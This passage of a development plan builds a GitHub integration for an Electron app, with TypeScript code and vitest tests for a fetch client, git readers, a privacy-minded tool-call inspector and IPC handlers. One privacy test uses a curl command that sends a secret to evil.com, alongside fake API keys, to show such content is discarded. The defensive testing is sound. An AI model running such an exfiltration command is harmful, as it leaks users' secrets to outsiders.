    expect(globalThis.fetch).not.toHaveBeenCalled()
  })

  it('POST passes JSON body', async () => {
    globalThis.fetch = vi.fn(async (_u: any, opts: any) => {
      expect(opts.method).toBe('POST')
      expect(opts.headers['Content-Type']).toBe('application/json')
      expect(JSON.parse(opts.body)).toEqual({ hi: 1 })
      return makeResp({ ok: true }) as any
    })
    await githubFetch('/x', { tokenFn, shield, etags, method: 'POST', body: { hi: 1 } })
  })
})
```

- [ ] **Step 2: Run — expect fail**

```bash
npx vitest run tests/unit/github/github-fetch.test.ts
```

- [ ] **Step 3: Implement**

```ts
// src/main/github/client/github-fetch.ts
import { GITHUB_API_BASE } from '../../../shared/github-constants'
import { EtagCache } from './etag-cache'
import { RateLimitShield, type Bucket } from './rate-limit-shield'

export class RateLimitError extends Error {
  constructor(public resetAt: number, public bucket: Bucket) {
    super(`rate-limited on ${bucket} until ${new Date(resetAt).toISOString()}`)
    this.name = 'RateLimitError'
  }
}

export interface GithubFetchOptions {
  tokenFn: () => Promise<string>
  shield: RateLimitShield
  etags: EtagCache
  bucket?: Bucket
  method?: 'GET' | 'POST' | 'PATCH' | 'PUT' | 'DELETE'
  body?: unknown
  baseUrl?: string
  extraHeaders?: Record<string, string>
}

export async function githubFetch(
  pathOrUrl: string,
  opts: GithubFetchOptions,
): Promise<Response> {
  const bucket: Bucket = opts.bucket ?? 'core'
  const now = Date.now()
  if (!opts.shield.canCall(bucket, now)) {
    throw new RateLimitError(opts.shield.nextAllowedAt(bucket) ?? now + 60_000, bucket)
  }

  const url = pathOrUrl.startsWith('http')
    ? pathOrUrl
    : (opts.baseUrl ?? GITHUB_API_BASE) + pathOrUrl
  const method = opts.method ?? 'GET'
  const key = `${method} ${pathOrUrl}`
  const token = await opts.tokenFn()
  const headers: Record<string, string> = {
    Authorization: `token ${token}`,
    Accept: 'application/vnd.github+json',
    'User-Agent': 'ClaudeCommandCenter',
    ...opts.extraHeaders,
  }
  if (method === 'GET') {
    const et = opts.etags.get(key)
    if (et) headers['If-None-Match'] = et
  }
  if (opts.body !== undefined) headers['Content-Type'] = 'application/json'

  const resp = await fetch(url, {
    method,
    headers,
    body: opts.body !== undefined ? JSON.stringify(opts.body) : undefined,
  })

  const limit = Number(resp.headers.get('x-ratelimit-limit'))
  const remaining = Number(resp.headers.get('x-ratelimit-remaining'))
  const reset = Number(resp.headers.get('x-ratelimit-reset'))
  if (limit && !Number.isNaN(remaining) && reset) {
    opts.shield.update(bucket, {
      limit, remaining, resetAt: reset * 1000, capturedAt: Date.now(),
    })
  }

  if (resp.status === 200) {
    const et = resp.headers.get('etag')
    if (et) opts.etags.set(key, et)
  }
  return resp
}
```

- [ ] **Step 4: Run + commit**

```bash
npx vitest run tests/unit/github/github-fetch.test.ts
git add src/main/github/client/github-fetch.ts tests/unit/github/github-fetch.test.ts
git commit -m "feat(github): githubFetch with ETag + per-bucket shield + RateLimitError"
```

---

### Task F5: GraphQL query + REST fallback

**Files:** CREATE `src/main/github/client/graphql-queries.ts`, `src/main/github/client/rest-fallback.ts`.

- [ ] **Step 1: GraphQL query**

```ts
// src/main/github/client/graphql-queries.ts
export const PR_CARD_QUERY = /* GraphQL */ `
  query PRCard($owner: String!, $name: String!, $branch: String!) {
    repository(owner: $owner, name: $name) {
      mergeCommitAllowed
      squashMergeAllowed
      rebaseMergeAllowed
      pullRequests(headRefName: $branch, states: [OPEN], first: 1) {
        nodes {
          number title body isDraft createdAt updatedAt
          url mergeable
          author { login avatarUrl }
          reviews(last: 30) {
            nodes {
              id state author { login avatarUrl }
              comments(last: 20) {
                nodes { id body path position originalPosition author { login } }
              }
            }
          }
          commits(last: 1) {
            nodes {
              commit {
                statusCheckRollup {
                  state
                  contexts(last: 50) {
                    nodes {
                      __typename
                      ... on CheckRun { name conclusion status detailsUrl }
                      ... on StatusContext { context state description targetUrl }
                    }
                  }
                }
              }
            }
          }
          closingIssuesReferences(first: 20) {
            nodes { number title state }
          }
        }
      }
    }
  }
`

export interface PrCardVariables {
  owner: string
  name: string
  branch: string
}
```

- [ ] **Step 2: REST fallback**

```ts
// src/main/github/client/rest-fallback.ts
import { githubFetch, type GithubFetchOptions } from './github-fetch'

type Opts = Pick<GithubFetchOptions, 'tokenFn' | 'shield' | 'etags'>

/**
 * Returns:
 *   { status: 'unchanged' } — 304, caller should keep existing cache
 *   { status: 'empty' }     — 2xx but no PR for this branch
 *   { status: 'ok', data }  — PR data available
 */
export async function fetchPRByBranch(
  slug: string,
  branch: string,
  opts: Opts,
): Promise<
  | { status: 'unchanged' }
  | { status: 'empty' }
  | { status: 'ok'; data: any }
> {
  const [owner] = slug.split('/')
  const head = `${encodeURIComponent(owner)}:${encodeURIComponent(branch)}`
  const r = await githubFetch(
    `/repos/${slug}/pulls?head=${head}&state=open`,
    opts,
  )
  if (r.status === 304) return { status: 'unchanged' }
  if (!r.ok) return { status: 'empty' }
  const arr = (await r.json()) as any[]
  return arr[0] ? { status: 'ok', data: arr[0] } : { status: 'empty' }
}

export async function fetchWorkflowRuns(
  slug: string,
  branch: string,
  opts: Opts,
): Promise<{ status: 'unchanged' } | { status: 'ok'; data: any[] }> {
  const r = await githubFetch(
    `/repos/${slug}/actions/runs?branch=${encodeURIComponent(branch)}&per_page=10`,
    opts,
  )
  if (r.status === 304) return { status: 'unchanged' }
  if (!r.ok) return { status: 'ok', data: [] }
  const body = (await r.json()) as { workflow_runs?: any[] }
  return { status: 'ok', data: body.workflow_runs ?? [] }
}

export async function fetchPRReviews(slug: string, pr: number, opts: Opts) {
  const r = await githubFetch(`/repos/${slug}/pulls/${pr}/reviews`, opts)
  if (r.status === 304) return { status: 'unchanged' as const }
  if (!r.ok) return { status: 'ok' as const, data: [] }
  return { status: 'ok' as const, data: (await r.json()) as any[] }
}

export async function fetchPRReviewComments(slug: string, pr: number, opts: Opts) {
  const r = await githubFetch(`/repos/${slug}/pulls/${pr}/comments`, opts)
  if (r.status === 304) return { status: 'unchanged' as const }
  if (!r.ok) return { status: 'ok' as const, data: [] }
  return { status: 'ok' as const, data: (await r.json()) as any[] }
}

export async function fetchRepoMergeSettings(slug: string, opts: Opts) {
  const r = await githubFetch(`/repos/${slug}`, opts)
  if (r.status === 304) return { status: 'unchanged' as const }
  if (!r.ok) return { status: 'empty' as const }
  const j = (await r.json()) as any
  const methods: Array<'merge' | 'squash' | 'rebase'> = []
  if (j.allow_merge_commit) methods.push('merge')
  if (j.allow_squash_merge) methods.push('squash')
  if (j.allow_rebase_merge) methods.push('rebase')
  return { status: 'ok' as const, data: { allowedMergeMethods: methods } }
}

export async function fetchNotifications(opts: Opts) {
  const r = await githubFetch('/notifications', opts)
  if (r.status === 304) return { status: 'unchanged' as const }
  if (!r.ok) return { status: 'ok' as const, data: [] }
  return { status: 'ok' as const, data: (await r.json()) as any[] }
}
```

- [ ] **Step 3: Typecheck + commit**

```bash
npm run typecheck
git add src/main/github/client/graphql-queries.ts src/main/github/client/rest-fallback.ts
git commit -m "feat(github): GraphQL PR query + REST fallback with 304-aware returns"
```

---

## Phase G — Session Integration

### Task G1: Repo detector (local git)

**Files:** CREATE `src/main/github/session/repo-detector.ts`, test.

- [ ] **Step 1: Test**

```ts
// tests/unit/github/repo-detector.test.ts
import { describe, it, expect, vi } from 'vitest'
import { detectRepoFromCwd } from '../../../src/main/github/session/repo-detector'

describe('detectRepoFromCwd', () => {
  it('parses git remote output', async () => {
    const run = vi.fn().mockResolvedValue('https://github.com/a/b.git\n')
    expect(await detectRepoFromCwd('/x', run)).toBe('a/b')
  })
  it('returns null on git error', async () => {
    const run = vi.fn().mockRejectedValue(new Error('no git'))
    expect(await detectRepoFromCwd('/x', run)).toBeNull()
  })
  it('returns null for non-github remote', async () => {
    const run = vi.fn().mockResolvedValue('https://gitlab.com/a/b.git\n')
    expect(await detectRepoFromCwd('/x', run)).toBeNull()
  })
})
```

- [ ] **Step 2: Implement + run + commit**

```ts
// src/main/github/session/repo-detector.ts
import { spawn } from 'node:child_process'
import { parseRepoUrl } from '../security/repo-url-parser'

export type RunGit = (cwd: string, args: string[]) => Promise<string>

export async function detectRepoFromCwd(cwd: string, run: RunGit): Promise<string | null> {
  try {
    const out = await run(cwd, ['remote', 'get-url', 'origin'])
    return parseRepoUrl(out)
  } catch {
    return null
  }
}

export function defaultGitRun(): RunGit {
  return (cwd, args) =>
    new Promise<string>((resolve, reject) => {
      const proc = spawn('git', args, { cwd, stdio: ['ignore', 'pipe', 'pipe'] })
      let stdout = ''
      let stderr = ''
      proc.stdout.on('data', (c) => (stdout += c.toString()))
      proc.stderr.on('data', (c) => (stderr += c.toString()))
      proc.on('error', reject)
      proc.on('close', (code) => {
        if (code !== 0) reject(new Error(stderr || `git exited ${code}`))
        else resolve(stdout)
      })
    })
}
```

```bash
npx vitest run tests/unit/github/repo-detector.test.ts
git add src/main/github/session/repo-detector.ts tests/unit/github/repo-detector.test.ts
git commit -m "feat(github): repo detector from git remote origin"
```

> **SSH note for PR 3:** SSH session repo detection will inject `git -C <remoteCwd> remote get-url origin; echo __END__` through the existing SSH PTY. Out of scope for PR 1 — add in PR 3 with a G1b task.

---

### Task G2: Local git reader

**Files:** CREATE `src/main/github/session/local-git-reader.ts`, test.

- [ ] **Step 1: Test**

```ts
// tests/unit/github/local-git-reader.test.ts
import { describe, it, expect, vi } from 'vitest'
import { readLocalGitState } from '../../../src/main/github/session/local-git-reader'

describe('readLocalGitState', () => {
  it('parses branch + ahead/behind + status', async () => {
    const run = vi.fn()
      .mockResolvedValueOnce('feature/x\n')                             // rev-parse --abbrev-ref HEAD
      .mockResolvedValueOnce('3\t1\n')                                  // rev-list --left-right --count
      .mockResolvedValueOnce('M  src/a.ts\n?? new.ts\n A  staged.ts\n') // status --porcelain
      .mockResolvedValueOnce('2\n')                                     // stash list
      .mockResolvedValueOnce('abc123|fix thing|1700000000\n')           // log recent
    const state = await readLocalGitState('/tmp', run)
    expect(state.branch).toBe('feature/x')
    expect(state.ahead).toBe(3)
    expect(state.behind).toBe(1)
    expect(state.staged).toContain('staged.ts')
    expect(state.unstaged).toContain('src/a.ts')
    expect(state.untracked).toContain('new.ts')
    expect(state.stashCount).toBe(2)
    expect(state.recentCommits[0].sha).toBe('abc123')
  })

  it('falls back to empty state when not a repo', async () => {
    const run = vi.fn().mockRejectedValue(new Error('not a git repo'))
    const s = await readLocalGitState('/tmp', run)
    expect(s.branch).toBeUndefined()
    expect(s.ahead).toBe(0)
    expect(s.behind).toBe(0)
  })
})
```

- [ ] **Step 2: Implement**

```ts
// src/main/github/session/local-git-reader.ts
import type { LocalGitState } from '../../../shared/github-types'
import type { RunGit } from './repo-detector'

const EMPTY: LocalGitState = {
  ahead: 0, behind: 0,
  staged: [], unstaged: [], untracked: [],
  stashCount: 0, recentCommits: [],
}

export async function readLocalGitState(cwd: string, run: RunGit): Promise<LocalGitState> {
  try {
    const branch = (await run(cwd, ['rev-parse', '--abbrev-ref', 'HEAD'])).trim()
    let ahead = 0, behind = 0
    try {
      const ab = (await run(cwd, ['rev-list', '--left-right', '--count', 'HEAD...@{upstream}'])).trim()
      const parts = ab.split(/\s+/)
      ahead = Number(parts[0]) || 0
      behind = Number(parts[1]) || 0
    } catch { /* no upstream */ }

    const status = await run(cwd, ['status', '--porcelain'])
    const staged: string[] = []
    const unstaged: string[] = []
    const untracked: string[] = []
    for (const line of status.split('\n')) {
      if (!line) continue
      const prefix = line.slice(0, 2)
      const file = line.slice(3)
      if (prefix === '??') untracked.push(file)
      else {
        if (prefix[0] !== ' ' && prefix[0] !== '?') staged.push(file)
        if (prefix[1] !== ' ' && prefix[1] !== '?') unstaged.push(file)
      }
    }

    let stashCount = 0
    try {
      const stashList = (await run(cwd, ['stash', 'list'])).trim()
      stashCount = stashList ? stashList.split('\n').length : 0
    } catch { /* ignore */ }

    let recentCommits: LocalGitState['recentCommits'] = []
    try {
      const log = await run(cwd, ['log', '-5', '--format=%H|%s|%ct'])
      recentCommits = log.trim().split('\n').filter(Boolean).map((l) => {
        const [sha, subject, ct] = l.split('|')
        return { sha: sha.slice(0, 7), subject, at: Number(ct) * 1000 }
      })
    } catch { /* ignore */ }

    return { branch, ahead, behind, staged, unstaged, untracked, stashCount, recentCommits }
  } catch {
    return EMPTY
  }
}
```

- [ ] **Step 3: Run + commit**

```bash
npx vitest run tests/unit/github/local-git-reader.test.ts
git add src/main/github/session/local-git-reader.ts tests/unit/github/local-git-reader.test.ts
git commit -m "feat(github): local git reader (branch, ahead/behind, status, stash, commits)"
```

---

### Task G3: Tool-call inspector (security-critical, explicit privacy tests)

**Files:** CREATE `src/main/github/session/tool-call-inspector.ts`, test.

- [ ] **Step 1: Test with explicit security invariants**

```ts
// tests/unit/github/tool-call-inspector.test.ts
import { describe, it, expect } from 'vitest'
import { extractFileSignals } from '../../../src/main/github/session/tool-call-inspector'

describe('extractFileSignals — positive paths', () => {
  it('captures file_path from Edit', () => {
    const ev = [{ type: 'tool_call', tool: 'Edit', args: { file_path: 'src/a.ts' }, timestamp: Date.now() }]
    const s = extractFileSignals(ev as any)
    expect(s[0].filePath).toBe('src/a.ts')
    expect(s[0].tool).toBe('Edit')
  })
  it('Bash with allowlisted first-token extracts path args', () => {
    const ev = [{ type: 'tool_call', tool: 'Bash', args: { command: 'cat src/shared/types.ts' }, timestamp: Date.now() }]
    const s = extractFileSignals(ev as any)
    expect(s.some((x) => x.filePath === 'src/shared/types.ts')).toBe(true)
  })
  it('caps to 20 distinct most-recent files', () => {
    const now = Date.now()
    const ev = Array.from({ length: 30 }, (_, i) => ({
      type: 'tool_call', tool: 'Read', args: { file_path: `f${i}.ts` }, timestamp: now - (29 - i) * 1000,
    }))
    const s = extractFileSignals(ev as any)
    expect(s.length).toBeLessThanOrEqual(20)
    expect(s.some((x) => x.filePath === 'f29.ts')).toBe(true)
  })
})

describe('extractFileSignals — security invariants (privacy promises)', () => {
  it('NEVER captures old_string or new_string from Edit', () => {
    const ev = [{
      type: 'tool_call', tool: 'Edit',
      args: { file_path: 'x.ts', old_string: 'SENSITIVE_OLD', new_string: 'SENSITIVE_NEW' },
      timestamp: Date.now(),
    }]
    const out = JSON.stringify(extractFileSignals(ev as any))
    expect(out).not.toContain('SENSITIVE_OLD')
    expect(out).not.toContain('SENSITIVE_NEW')
  })

  it('NEVER captures command body beyond first token for allowlisted Bash', () => {
    const ev = [{
      type: 'tool_call', tool: 'Bash',
      args: { command: 'git commit -m "API_KEY=sk-secret ghp_leak"' },
      timestamp: Date.now(),
    }]
    const out = JSON.stringify(extractFileSignals(ev as any))
    expect(out).not.toContain('API_KEY')
    expect(out).not.toContain('sk-secret')
    expect(out).not.toContain('ghp_leak')
  })

  it('NEVER reads tool-call result fields', () => {
    const ev = [{
      type: 'tool_call', tool: 'Edit',
      args: { file_path: 'x.ts' },
      result: { leaked: 'SHOULD_NOT_APPEAR' },
      timestamp: Date.now(),
    }]
    const out = JSON.stringify(extractFileSignals(ev as any))
    expect(out).not.toContain('SHOULD_NOT_APPEAR')
  })

  it('ignores non-allowlisted Bash first tokens entirely', () => {
    const ev = [{
      type: 'tool_call', tool: 'Bash',
      args: { command: 'curl https://evil.com?exfil=SECRET' },
      timestamp: Date.now(),
    }]
    const out = JSON.stringify(extractFileSignals(ev as any))
    expect(out).not.toContain('evil.com')
    expect(out).not.toContain('SECRET')
    expect(extractFileSignals(ev as any)).toEqual([])
  })

  it('ignores non-allowlisted tool types', () => {
    const ev = [
      { type: 'tool_call', tool: 'WebFetch', args: { url: 'http://x' }, timestamp: Date.now() },
      { type: 'tool_call', tool: 'TodoWrite', args: {}, timestamp: Date.now() },
    ]
    expect(extractFileSignals(ev as any)).toEqual([])
  })
})
```

- [ ] **Step 2: Run — expect fail**

```bash
npx vitest run tests/unit/github/tool-call-inspector.test.ts
```

- [ ] **Step 3: Implement with intentional narrowness**

```ts
// src/main/github/session/tool-call-inspector.ts
import type { ToolCallFileSignal } from '../../../shared/github-types'

export interface TranscriptToolCall {
  type: 'tool_call'
  tool: string
  args: Record<string, unknown>
  timestamp: number
  // Note: we deliberately do not destructure result — we never read it.
}

const FILE_TOOLS = new Set(['Read', 'Write', 'Edit', 'NotebookEdit', 'MultiEdit'])
const BASH_PATH_ALLOWLIST = new Set(['git', 'gh', 'cat', 'rm', 'mv', 'cp', 'ls', 'mkdir'])
const PATH_ARG_REGEX = /^(?:\/|~|\.\/|\.\.\/|[A-Za-z]:|\w+\/)/

const MAX_FILES = 20
const MAX_LOOKBACK_EVENTS = 100
const MAX_LOOKBACK_MS = 30 * 60 * 1000

export function extractFileSignals(events: TranscriptToolCall[]): ToolCallFileSignal[] {
  const now = Date.now()
  const cutoff = now - MAX_LOOKBACK_MS
  const recent = events.slice(-MAX_LOOKBACK_EVENTS).filter((e) => e.timestamp >= cutoff)

  const signals: ToolCallFileSignal[] = []
  for (const e of recent) {
    if (e.type !== 'tool_call') continue

    if (FILE_TOOLS.has(e.tool)) {
      // ONLY file_path is read. Any other field in e.args is ignored.
      const fp = typeof e.args?.file_path === 'string' ? e.args.file_path : null
      if (fp) {
        signals.push({
          filePath: fp,
          at: e.timestamp,
          tool: e.tool as ToolCallFileSignal['tool'],
        })
      }
      continue
    }

    if (e.tool === 'Bash') {
      const cmd = typeof e.args?.command === 'string' ? e.args.command : ''
      // Read ONLY the first token to categorize. The rest of the command is
      // tokenized and filtered to path-like args, not stored raw.
      const tokens = cmd.trim().split(/\s+/)
      const first = tokens[0] ?? ''
      if (!BASH_PATH_ALLOWLIST.has(first)) continue
      // Only path-shaped tokens after the first are captured. Anything that
      // doesn't match PATH_ARG_REGEX is dropped. Secrets that don't look like
      // paths won't be captured even if present.
      for (const tok of tokens.slice(1)) {
        if (PATH_ARG_REGEX.test(tok)) {
          signals.push({ filePath: tok, at: e.timestamp, tool: 'Bash' })
        }
      }
    }
    // All other tools: nothing is read.
  }

  // Dedupe by filePath (newest wins)
  const latest = new Map<string, ToolCallFileSignal>()
  for (const s of signals) {
    const prev = latest.get(s.filePath)
    if (!prev || s.at > prev.at) latest.set(s.filePath, s)
  }
  return Array.from(latest.values())
    .sort((a, b) => b.at - a.at)
    .slice(0, MAX_FILES)
}
```

- [ ] **Step 4: Run + commit**

```bash
npx vitest run tests/unit/github/tool-call-inspector.test.ts
git add src/main/github/session/tool-call-inspector.ts tests/unit/github/tool-call-inspector.test.ts
git commit -m "feat(github): tool-call inspector with explicit privacy invariants"
```

---

### Task G4: Transcript scanner (opt-in)

**Files:** CREATE `src/main/github/session/transcript-scanner.ts`, test.

- [ ] **Step 1: Test**

```ts
// tests/unit/github/transcript-scanner.test.ts
import { describe, it, expect } from 'vitest'
import { scanTranscriptMessages } from '../../../src/main/github/session/transcript-scanner'

describe('scanTranscriptMessages', () => {
  it('extracts #NNN, GH-NNN, and URLs', () => {
    const msgs = [
      { role: 'user', text: 'Fix #247 and see GH-100 also https://github.com/a/b/pull/12', ts: 1 },
    ]
    const refs = scanTranscriptMessages(msgs as any)
    expect(refs.map((r) => r.number).sort()).toEqual([12, 100, 247])
  })

  it('only reads last 50 messages', () => {
    const msgs = Array.from({ length: 100 }, (_, i) => ({
      role: 'user' as const, text: `#${i}`, ts: i,
    }))
    const refs = scanTranscriptMessages(msgs)
    expect(refs.every((r) => r.number >= 50)).toBe(true)
  })

  it('ignores non-user/assistant roles', () => {
    const msgs = [{ role: 'tool_call', text: '#999', ts: 1 } as any]
    expect(scanTranscriptMessages(msgs)).toEqual([])
  })

  it('never includes message text excerpt in output', () => {
    const msgs = [{ role: 'user', text: 'SECRET_LEAK #42', ts: 1 }]
    const refs = scanTranscriptMessages(msgs as any)
    expect(JSON.stringify(refs)).not.toContain('SECRET_LEAK')
  })
})
```

- [ ] **Step 2: Implement**

```ts
// src/main/github/session/transcript-scanner.ts
import type { TranscriptReference } from '../../../shared/github-types'
import {
  TRANSCRIPT_GH_REGEX,
  TRANSCRIPT_ISSUE_REGEX,
  TRANSCRIPT_URL_REGEX,
} from '../../../shared/github-constants'

export interface TranscriptMessage {
  role: 'user' | 'assistant' | string
  text: string
  ts: number
}

const MAX_MESSAGES = 50

export function scanTranscriptMessages(messages: TranscriptMessage[]): TranscriptReference[] {
  const recent = messages
    .filter((m) => m.role === 'user' || m.role === 'assistant')
    .slice(-MAX_MESSAGES)

  const refs: TranscriptReference[] = []
  for (const m of recent) {
    if (typeof m.text !== 'string') continue
    for (const mt of m.text.matchAll(TRANSCRIPT_ISSUE_REGEX)) {
      refs.push({ kind: 'issue', number: Number(mt[1]), at: m.ts })
    }
    for (const mt of m.text.matchAll(TRANSCRIPT_GH_REGEX)) {
      refs.push({ kind: 'issue', number: Number(mt[1]), at: m.ts })
    }
    for (const mt of m.text.matchAll(TRANSCRIPT_URL_REGEX)) {
      refs.push({
        kind: mt[3] === 'pull' ? 'pr' : 'issue',
        repo: `${mt[1]}/${mt[2]}`,
        number: Number(mt[4]),
        at: m.ts,
      })
    }
  }
  return refs
}
```

- [ ] **Step 3: Run + commit**

```bash
npx vitest run tests/unit/github/transcript-scanner.test.ts
git add src/main/github/session/transcript-scanner.ts tests/unit/github/transcript-scanner.test.ts
git commit -m "feat(github): opt-in transcript scanner (text only, no content exposure)"
```

---

### Task G5: Session context service (combines signals with priority)

**Files:** CREATE `src/main/github/session/session-context-service.ts`, test.

- [ ] **Step 1: Test (priority algorithm)**

```ts
// tests/unit/github/session-context-service.test.ts
import { describe, it, expect, vi } from 'vitest'
import { buildSessionContext } from '../../../src/main/github/session/session-context-service'

describe('buildSessionContext — priority algorithm', () => {
  it('branch name wins over transcript', async () => {
    const r = await buildSessionContext({
      branchName: 'fix-247-login',
      transcriptRefs: [{ kind: 'issue', number: 999, at: 1 }],
      prBodyRefs: [42],
      recentFiles: [],
      enrichIssue: async () => null,
      sessionRepo: 'a/b',
    })
    expect(r.primaryIssue?.number).toBe(247)
  })
  it('transcript wins over PR body when no branch match', async () => {
    const r = await buildSessionContext({
      branchName: 'random-name',
      transcriptRefs: [{ kind: 'issue', number: 100, at: 1 }],
      prBodyRefs: [42],
      recentFiles: [],
      enrichIssue: async () => null,
      sessionRepo: 'a/b',
    })
    expect(r.primaryIssue?.number).toBe(100)
  })
  it('PR body wins when no branch and no transcript', async () => {
    const r = await buildSessionContext({
      branchName: 'random',
      transcriptRefs: [],
      prBodyRefs: [42],
      recentFiles: [],
      enrichIssue: async () => null,
      sessionRepo: 'a/b',
    })
    expect(r.primaryIssue?.number).toBe(42)
  })
  it('no primary when no signals', async () => {
    const r = await buildSessionContext({
      branchName: undefined,
      transcriptRefs: [],
      prBodyRefs: [],
      recentFiles: [],
      enrichIssue: async () => null,
      sessionRepo: 'a/b',
    })
    expect(r.primaryIssue).toBeUndefined()
  })
  it('populates otherSignals with non-winning matches', async () => {
    const r = await buildSessionContext({
      branchName: 'fix-1-x',
      transcriptRefs: [{ kind: 'issue', number: 2, at: 1 }],
      prBodyRefs: [3],
      recentFiles: [],
      enrichIssue: async () => null,
      sessionRepo: 'a/b',
    })
    expect(r.primaryIssue?.number).toBe(1)
    expect(r.otherSignals.map((s) => s.number).sort()).toEqual([2, 3])
  })
  it('enriches primary issue when enricher provided', async () => {
    const r = await buildSessionContext({
      branchName: 'fix-42-x',
      transcriptRefs: [],
      prBodyRefs: [],
      recentFiles: [],
      enrichIssue: async (repo, n) => ({ title: `issue ${n}`, state: 'open', assignee: 'me' }),
      sessionRepo: 'a/b',
    })
    expect(r.primaryIssue?.title).toBe('issue 42')
  })
})

describe('extractBranchIssueNumber', () => {
  it('matches fix-NNN', async () => {
    const { extractBranchIssueNumber } = await import('../../../src/main/github/session/session-context-service')
    expect(extractBranchIssueNumber('fix-247-login')).toBe(247)
  })
  it('matches feat/NNN', async () => {
    const { extractBranchIssueNumber } = await import('../../../src/main/github/session/session-context-service')
    expect(extractBranchIssueNumber('feat/99-xyz')).toBe(99)
  })
  it('matches bare NNN-', async () => {
    const { extractBranchIssueNumber } = await import('../../../src/main/github/session/session-context-service')
    expect(extractBranchIssueNumber('100-x')).toBe(100)
  })
  it('returns null on no match', async () => {
    const { extractBranchIssueNumber } = await import('../../../src/main/github/session/session-context-service')
    expect(extractBranchIssueNumber('my-branch')).toBeNull()
  })
})
```

- [ ] **Step 2: Run — expect fail**

```bash
npx vitest run tests/unit/github/session-context-service.test.ts
```

- [ ] **Step 3: Implement**

```ts
// src/main/github/session/session-context-service.ts
import type {
  SessionContextResult,
  ToolCallFileSignal,
  TranscriptReference,
} from '../../../shared/github-types'
import { BRANCH_ISSUE_REGEXES } from '../../../shared/github-constants'

export function extractBranchIssueNumber(branchName: string): number | null {
  for (const re of BRANCH_ISSUE_REGEXES) {
    const m = branchName.match(re)
    if (m) return Number(m[1])
  }
  return null
}

export interface BuildContextInput {
  branchName: string | undefined
  transcriptRefs: TranscriptReference[]
  prBodyRefs: number[]
  recentFiles: ToolCallFileSignal[]
  sessionRepo: string | undefined
  enrichIssue: (repo: string, number: number) => Promise<
    { title?: string; state?: 'open' | 'closed'; assignee?: string } | null
  >
  activePR?: { number: number; state: 'open' | 'closed' | 'merged'; draft: boolean }
}

export async function buildSessionContext(input: BuildContextInput): Promise<SessionContextResult> {
  const branchNum = input.branchName ? extractBranchIssueNumber(input.branchName) : null

  const primaryNum =
    branchNum ??
    (input.transcriptRefs.length > 0
      ? input.transcriptRefs[input.transcriptRefs.length - 1].number
      : null) ??
    (input.prBodyRefs[0] ?? null)

  const otherSignals: SessionContextResult['otherSignals'] = []
  if (branchNum && branchNum !== primaryNum)
    otherSignals.push({ source: 'branch', number: branchNum })
  for (const t of input.transcriptRefs) {
    if (t.number !== primaryNum)
      otherSignals.push({ source: 'transcript', number: t.number, repo: t.repo })
  }
  for (const n of input.prBodyRefs) {
    if (n !== primaryNum)
      otherSignals.push({ source: 'pr-body', number: n })
  }

  let primaryIssue: SessionContextResult['primaryIssue']
  if (primaryNum !== null && input.sessionRepo) {
    const enriched = await input.enrichIssue(input.sessionRepo, primaryNum).catch(() => null)
    primaryIssue = {
      number: primaryNum,
      repo: input.sessionRepo,
      ...enriched,
    } as SessionContextResult['primaryIssue']
  } else if (primaryNum !== null) {
    primaryIssue = { number: primaryNum }
  }

  return {
    primaryIssue,
    otherSignals,
    recentFiles: input.recentFiles,
    activePR: input.activePR,
  }
}
```

- [ ] **Step 4: Run + commit**

```bash
npx vitest run tests/unit/github/session-context-service.test.ts
git add src/main/github/session/session-context-service.ts tests/unit/github/session-context-service.test.ts
git commit -m "feat(github): session context service with priority algorithm"
```

---

## Phase H — IPC Handlers + Preload + Types

### Task H1: IPC handlers with real session persistence

**Files:** CREATE `src/main/ipc/github-handlers.ts`. MODIFY `src/main/index.ts`.

- [ ] **Step 1: Read existing session persistence pattern**

```bash
grep -n "loadConfig\|saveConfig\|SessionState" src/main/config-manager.ts | head -20
```
Note the load/save function names used by other handlers (e.g., tokenomics, cloud-agents). Follow the same calling pattern.

- [ ] **Step 2: Create handler file**

```ts
// src/main/ipc/github-handlers.ts
import { ipcMain, BrowserWindow } from 'electron'
import { IPC } from '../../shared/ipc-channels'
import type { GitHubConfig, SessionGitHubIntegration, SavedSession } from '../../shared/types'
import type { AuthProfile } from '../../shared/github-types'
import { GitHubConfigStore } from '../github/github-config-store'
import { AuthProfileStore } from '../github/auth/auth-profile-store'
import { ghAuthStatus, ghAuthToken, defaultGhRun } from '../github/auth/gh-cli-delegate'
import {
  requestDeviceCode, pollForAccessToken,
} from '../github/auth/oauth-device-flow'
import { verifyToken, probeRepoAccess } from '../github/auth/pat-verifier'
import { scopesToCapabilities } from '../github/auth/capability-mapper'
import { detectRepoFromCwd, defaultGitRun } from '../github/session/repo-detector'
import { readLocalGitState } from '../github/session/local-git-reader'
import { validateSlug } from '../github/security/slug-validator'
import { OAUTH_SCOPES_PRIVATE, OAUTH_SCOPES_PUBLIC } from '../../shared/github-constants'

type LoadSessions = () => Promise<SavedSession[]>
type SaveSessions = (sessions: SavedSession[]) => Promise<void>

interface RegisterDeps {
  resourcesDir: string
  getWindow: () => BrowserWindow | null
  loadSessions: LoadSessions
  saveSessions: SaveSessions
}

interface OAuthFlow {
  deviceCode: string
  intervalSec: number
  scope: string
  cancelled: boolean
}

export function registerGitHubHandlers(deps: RegisterDeps) {
  const configStore = new GitHubConfigStore(deps.resourcesDir)
  const profileStore = new AuthProfileStore({
    readConfig: () => configStore.read(),
    writeConfig: (c) => configStore.write(c),
  })
  const activeFlows = new Map<string, OAuthFlow>()

  ipcMain.handle(IPC.GITHUB_CONFIG_GET, async () => {
    return (await configStore.read()) ?? null
  })

  ipcMain.handle(IPC.GITHUB_CONFIG_UPDATE, async (_e, patch: Partial<GitHubConfig>) => {
    const cur = (await configStore.read()) ?? await emptyConfigFrom(configStore)
    const next = { ...cur, ...patch }
    await configStore.write(next)
    return next
  })

  ipcMain.handle(IPC.GITHUB_PROFILE_ADD_PAT, async (_e, input: {
    kind: 'pat-classic' | 'pat-fine-grained'
    label: string
    rawToken: string
    allowedRepos?: string[]
  }) => {
    const v = await verifyToken(input.rawToken)
    if (!v) return { ok: false, error: 'Invalid token' }
    const caps = scopesToCapabilities(
      input.kind === 'pat-fine-grained' ? 'fine-grained' : 'classic',
      v.scopes,
    )
    let allowed: string[] | undefined
    if (input.kind === 'pat-fine-grained' && input.allowedRepos) {
      allowed = []
      for (const slug of input.allowedRepos) {
        if (!validateSlug(slug)) continue
        if (await probeRepoAccess(input.rawToken, slug)) allowed.push(slug)
      }
    }
    const id = await profileStore.addProfile({
      kind: input.kind,
      label: input.label,
      username: v.username,
      avatarUrl: v.avatarUrl,
      scopes: v.scopes,
      capabilities: caps,
      allowedRepos: allowed,
      rawToken: input.rawToken,
      expiresAt: v.expiresAt,
